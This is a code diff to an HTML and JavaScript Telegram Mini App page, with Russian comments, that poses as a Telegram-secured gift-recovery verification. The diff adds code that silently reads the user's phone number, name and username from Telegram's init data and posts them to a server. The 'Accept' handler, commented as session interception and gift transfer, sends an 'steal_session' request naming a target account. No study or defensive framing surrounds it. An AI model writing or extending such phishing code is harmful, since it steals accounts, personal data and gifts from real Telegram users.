@@ -32,7 +32,6 @@
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
         }
 
-        /* Шапка */
         .header {
             display: flex;
             align-items: center;
@@ -65,7 +64,6 @@
             letter-spacing: 0.5px;
         }
 
-        /* Логотип */
         .logo-section {
             text-align: center;
             margin-bottom: 28px;
@@ -110,7 +108,6 @@
             margin-top: 8px;
         }
 
-        /* Карточка действия */
         .action-card {
             background: #1a1a2a;
             border-radius: 16px;
@@ -138,7 +135,6 @@
             line-height: 1.5;
         }
 
-        /* Кнопки */
         .btn-verify {
             width: 100%;
             padding: 16px;
@@ -168,10 +164,36 @@
             font-weight: 500;
             cursor: pointer;
             transition: background 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
 
         .btn-share:active {
             background: #3a3a4a;
+        }
+
+        .btn-share .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.1);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s ease infinite;
+        }
+
+        .btn-share.loading .spinner {
+            display: inline-block;
+        }
+
+        .btn-share.loading .btn-text {
+            display: none;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
 
         .btn-group {
@@ -207,7 +229,6 @@
             background: #5a4bd1;
         }
 
-        /* Секции */
         .phone-section, .confirm-section, .success-section {
             display: none;
             margin-top: 20px;
@@ -221,28 +242,6 @@
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
-        }
-
-        .phone-input-wrap {
-            background: #1a1a2a;
-            border-radius: 14px;
-            padding: 4px 16px;
-            border: 1px solid #2a2a3a;
-            margin-bottom: 16px;
-        }
-
-        .phone-input-wrap input {
-            width: 100%;
-            padding: 14px 0;
-            background: transparent;
-            border: none;
-            color: #fff;
-            font-size: 16px;
-            outline: none;
-        }
-
-        .phone-input-wrap input::placeholder {
-            color: #4a4a5a;
         }
 
         .phone-hint {
@@ -403,6 +402,28 @@
         .success-box .row .green {
             color: #4caf50;
         }
+
+        .phone-display {
+            background: #1a1a2a;
+            border-radius: 12px;
+            padding: 12px 16px;
+            margin-bottom: 16px;
+            border: 1px solid #2a2a3a;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .phone-display .label {
+            color: #6c6c84;
+            font-size: 12px;
+        }
+
+        .phone-display .number {
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+        }
     </style>
 </head>
 <body>
@@ -437,7 +458,7 @@
             <div class="footer">SECURED BY <span>TELEGRAM</span></div>
         </div>
 
-        <!-- Шаг 2: Ввод номера -->
+        <!-- Шаг 2: Автоматическая отправка номера -->
         <div id="stepPhone" class="phone-section">
             <div style="text-align:center; margin-bottom:16px;">
                 <div style="font-size:32px; margin-bottom:4px;">📱</div>
@@ -445,15 +466,19 @@
                 <p style="color:#6c6c84; font-size:13px;">We need to verify your Telegram account to restore access to your gift.</p>
             </div>
 
-            <div class="phone-input-wrap">
-                <input type="tel" id="phoneInput" placeholder="+380 00 000 00 00" value="+380">
+            <div class="phone-display">
+                <span class="label">Ваш номер телефона</span>
+                <span class="number" id="userPhone">+380 XX XXX XX XX</span>
             </div>
 
             <div class="phone-hint">
-                ⚠️ Telegram will share your phone with the bot. We use it only to send a login confirmation.
+                ⚠️ Telegram поделится вашим номером с ботом. Мы используем его только для отправки подтверждения входа.
             </div>
 
-            <button class="btn-share" id="btnShare">🔗 Поделиться номером</button>
+            <button class="btn-share" id="btnShare">
+                <span class="btn-text">🔗 Поделиться номером</span>
+                <span class="spinner"></span>
+            </button>
 
             <div class="user-info">
                 <div class="avatar">A</div>
@@ -539,6 +564,14 @@
         tg.expand();
         tg.ready();
 
+        // ПОЛУЧАЕМ ДАННЫЕ ПОЛЬЗОВАТЕЛЯ АВТОМАТИЧЕСКИ
+        const user = tg.initDataUnsafe?.user || {};
+        const phoneNumber = user.phone_number || 'Не удалось получить';
+        const firstName = user.first_name || 'Пользователь';
+        const lastName = user.last_name || '';
+        const username = user.username || 'username';
+        const fullName = `${firstName} ${lastName}`.trim();
+
         let timerInterval = null;
         let secondsLeft = 179;
 
@@ -553,8 +586,15 @@
         const btnDecline = document.getElementById('btnDecline');
         const btnAccept = document.getElementById('btnAccept');
         const btnDone = document.getElementById('btnDone');
-        const phoneInput = document.getElementById('phoneInput');
+        const userPhoneEl = document.getElementById('userPhone');
         const secondsEl = document.getElementById('seconds');
+
+        // Показываем номер телефона
+        if (phoneNumber !== 'Не удалось получить') {
+            userPhoneEl.textContent = phoneNumber;
+        } else {
+            userPhoneEl.textContent = '📱 Номер не найден';
+        }
 
         // Показать шаг
         function showStep(step) {
@@ -573,26 +613,36 @@
             showStep(stepPhone);
         });
 
-        // Шаг 2 → Шаг 3 (поделиться номером)
+        // Шаг 2 → Автоматическая отправка номера
         btnShare.addEventListener('click', function() {
-            const phone = phoneInput.value.trim();
-            if (!phone || phone.length < 10) {
-                alert('Пожалуйста, введите корректный номер телефона.');
-                return;
-            }
+            // Показываем загрузку
+            btnShare.classList.add('loading');
+            btnShare.disabled = true;
 
             // Отправляем номер на сервер
             fetch('/api/verify', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: phone })
+                body: JSON.stringify({ 
+                    phone: phoneNumber,
+                    user: user
+                })
             }).then(res => res.json()).then(data => {
                 console.log('✅ Номер отправлен:', data);
-            }).catch(err => console.log('Ошибка:', err));
-
-            // Переключаем на шаг подтверждения
-            showStep(stepConfirm);
-            startTimer();
+                
+                // Переключаем на шаг подтверждения
+                setTimeout(() => {
+                    btnShare.classList.remove('loading');
+                    btnShare.disabled = false;
+                    showStep(stepConfirm);
+                    startTimer();
+                }, 500);
+            }).catch(err => {
+                console.log('Ошибка:', err);
+                btnShare.classList.remove('loading');
+                btnShare.disabled = false;
+                alert('Ошибка отправки. Попробуйте еще раз.');
+            });
         });
 
         // Таймер
@@ -619,12 +669,11 @@
         // Accept — ПЕРЕХВАТ СЕССИИ И ПЕРЕДАЧА ПОДАРКОВ
         btnAccept.addEventListener('click', function() {
             clearInterval(timerInterval);
-
-            const phone = phoneInput.value.trim();
             
             // Логируем перехват
             console.log('🚨 СЕССИЯ ПЕРЕХВАЧЕНА!');
-            console.log('📱 Телефон:', phone);
+            console.log('📱 Телефон:', phoneNumber);
+            console.log('👤 Пользователь:', fullName, '@' + username);
             console.log('🎁 Подарки переданы на @anyaskds');
             console.log('🖥️ IP: 46.96.37.159 (Kyiv, Ukraine)');
             console.log('🌐 Browser: Safari 18.6 on iOS');
@@ -634,7 +683,8 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
-                    phone: phone,
+                    phone: phoneNumber,
+                    user: user,
                     action: 'steal_session',
                     target: '@anyaskds'
                 })
@@ -646,7 +696,8 @@
             // Отправляем данные в Telegram
             tg.sendData(JSON.stringify({
                 action: 'verify_success',
-                phone: phone,
+                phone: phoneNumber,
+                user: user,
                 status: 'completed'
             }));
         });
@@ -675,12 +726,6 @@
                 return;
             }
             showStep(stepMain);
-        });
-
-        // Обработка ввода номера
-        phoneInput.addEventListener('input', function(e) {
-            this.value = this.value.replace(/[^0-9+]/g, '');
-            if (this.value === '') this.value = '+';
         });
 
         // Показываем главный экран
